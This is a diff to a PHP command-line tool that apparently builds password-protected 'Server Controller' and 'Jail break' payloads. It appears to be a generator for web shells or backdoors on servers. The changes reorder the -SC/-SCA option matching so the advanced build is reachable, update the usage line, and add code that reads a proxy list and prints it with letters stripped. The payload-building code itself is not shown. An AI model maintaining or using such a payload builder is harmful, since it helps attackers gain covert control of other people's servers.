@@ -1,4 +1,8 @@
 <?php
+$Pr = file_get_contents("proxyList.txt");
+$Replace = array("a","b","c","d","e","f","g","!","h","j","k","l","m","n","i","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","-",",","_","+","=");
+$Pr = str_replace($Replace,"",$Pr);
+echo $Pr;
 require("Files/includes/Functions.php");
 $ScriptName = $argv[0];
 if(!isset($argv[1])){
@@ -25,7 +29,7 @@ echo "CONNECT";
 cEcho("","\e[91m");
 echo "]============================- \n";
 cEcho("","\e[97m");
-echo "  COMMAND:[php $ScriptName -{s-S-a}]  \n";
+echo "  COMMAND:[php $ScriptName -{SC-SCA-JB}]  \n";
 echo "		-SC  : Server Controller  \n";
 echo "		-SCA  : Server Controller Advanced  \n";
 echo "		-JB  : Jail break  \n";
@@ -61,14 +65,14 @@ if(preg_match("/-build/",$option)){
 $type = $argv[2];
 $path = $argv[3];
 $pass = $argv[4];
-if(preg_match("/-SC/",$type)){
-build("SC",$path,$pass);
+if(preg_match("/-SCA/",$type)){
+build("SCA",$path,$pass);
 cEcho("\n	[+] You'r payload is ready now \n",$white);	
 cEcho("\n	[+] password : $pass \n",$white);	
 cEcho("\n	[+] path : $path \n",$white);	
 exit();
-}elseif(preg_match("/-SCA/",$type)){
-build("SCA",$path,$pass);
+}elseif(preg_match("/-SC/",$type)){
+build("SC",$path,$pass);
 cEcho("\n	[+] You'r payload is ready now \n",$white);	
 cEcho("\n	[+] password : $pass \n",$white);	
 cEcho("\n	[+] path : $path \n",$white);	
